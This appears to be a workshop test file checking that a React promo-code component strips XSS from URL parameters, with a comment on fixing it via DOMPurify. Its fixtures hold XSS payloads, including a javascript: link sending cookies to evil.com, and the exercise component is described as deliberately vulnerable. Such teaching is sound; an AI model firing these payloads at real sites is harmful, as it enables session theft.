/**
 * Security Tests for Promo Codes Component
 * 
 * These tests verify that the component properly sanitizes user input
 * to prevent XSS (Cross-Site Scripting) attacks.
 * 
 * Workshop participants should make promo-codes-task.jsx pass all these tests.
 */

import { describe, it, expect, beforeEach, vi } from 'vitest';
import { render, screen } from '@testing-library/react';
import RedeemPromo from './promo-codes-task';

// Mock window.location
const mockLocation = {
  search: '',
  href: ''
};

beforeEach(() => {
  vi.stubGlobal('location', mockLocation);
  mockLocation.search = '';
});

describe('Promo Codes Security Tests', () => {
  
  describe('XSS Prevention - Script Tags', () => {
    it('should not execute script tags in promo code', () => {
      mockLocation.search = '?promo=<script>alert("XSS")</script>';
      
      const { container } = render(<RedeemPromo />);
      
      const scripts = container.querySelectorAll('script');
      expect(scripts.length).toBe(0);
      expect(container.innerHTML).not.toContain('<script>');
    });

    it('should sanitize script tags from URL parameters', () => {
      mockLocation.search = '?promo=SAVE20<script>stealCookies()</script>';
      
      const { container } = render(<RedeemPromo />);
      
      expect(container.innerHTML).not.toContain('<script>');
      expect(container.innerHTML).not.toContain('stealCookies');
    });
  });

  describe('XSS Prevention - Event Handlers', () => {
    it('should not render onerror event handlers', () => {
      mockLocation.search = '?promo=<img src="x" onerror="alert(document.cookie)">';
      
      const { container } = render(<RedeemPromo />);
      
      expect(container.innerHTML).not.toContain('onerror');
    });

    it('should not render onclick event handlers', () => {
      mockLocation.search = '?promo=<span onclick="malicious()">PROMO</span>';
      
      const { container } = render(<RedeemPromo />);
      
      expect(container.innerHTML).not.toContain('onclick');
    });

    it('should not render onfocus event handlers', () => {
      mockLocation.search = '?promo=<input onfocus="evil()" autofocus>';
      
      const { container } = render(<RedeemPromo />);
      
      expect(container.innerHTML).not.toContain('onfocus');
    });
  });

  describe('XSS Prevention - JavaScript URLs', () => {
    it('should not render javascript: protocol in links', () => {
      mockLocation.search = '?promo=<a href="javascript:void(document.location=\'http://evil.com/\'+document.cookie)">Click for bonus!</a>';
      
      const { container } = render(<RedeemPromo />);
      
      expect(container.innerHTML).not.toContain('javascript:');
    });
  });

  describe('XSS Prevention - Encoded Attacks', () => {
    it('should handle HTML entity encoded attacks', () => {
      // &#60; is < and &#62; is >
      mockLocation.search = '?promo=&#60;script&#62;alert("XSS")&#60;/script&#62;';
      
      const { container } = render(<RedeemPromo />);
      
      // After decoding, should still not execute
      expect(container.innerHTML).not.toContain('<script>');
    });
  });

  describe('XSS Prevention - IMG Tag Attacks', () => {
    it('should sanitize img tags with onerror', () => {
      mockLocation.search = '?promo=<img src=x onerror=alert("XSS")>';
      
      const { container } = render(<RedeemPromo />);
      
      expect(container.innerHTML).not.toContain('onerror');
    });

    it('should sanitize img tags with onload', () => {
      mockLocation.search = '?promo=<img src="valid.jpg" onload="alert(\'XSS\')">';
      
      const { container } = render(<RedeemPromo />);
      
      expect(container.innerHTML).not.toContain('onload');
    });
  });

  describe('XSS Prevention - Style-based Attacks', () => {
    it('should not allow style tags with expressions', () => {
      mockLocation.search = '?promo=<style>body{background:url("javascript:alert(\'XSS\')")}</style>';
      
      const { container } = render(<RedeemPromo />);
      
      expect(container.innerHTML).not.toContain('javascript:');
    });
  });

  describe('Safe Content Rendering', () => {
    it('should display normal promo codes safely', () => {
      mockLocation.search = '?promo=SUMMER2024';
      
      render(<RedeemPromo />);
      
      expect(screen.getByText('SUMMER2024')).toBeInTheDocument();
    });

    it('should display promo codes with numbers and special chars', () => {
      mockLocation.search = '?promo=SAVE-50-OFF';
      
      render(<RedeemPromo />);
      
      expect(screen.getByText('SAVE-50-OFF')).toBeInTheDocument();
    });
  });
});

/**
 * WORKSHOP INSTRUCTIONS:
 * 
 * The promo-codes-task.jsx file has a security vulnerability - it uses
 * dangerouslySetInnerHTML without sanitizing the input first.
 * 
 * To fix the vulnerability:
 * 
 * 1. Import DOMPurify:
 *    import DOMPurify from 'dompurify';
 * 
 * 2. Sanitize the promo code before rendering:
 *    dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(promoCode, {
 *      ALLOWED_TAGS: ['strong'],
 *    })}}
 * 
 * Compare your fix with promo-codes.jsx to see the complete secure implementation.
 */
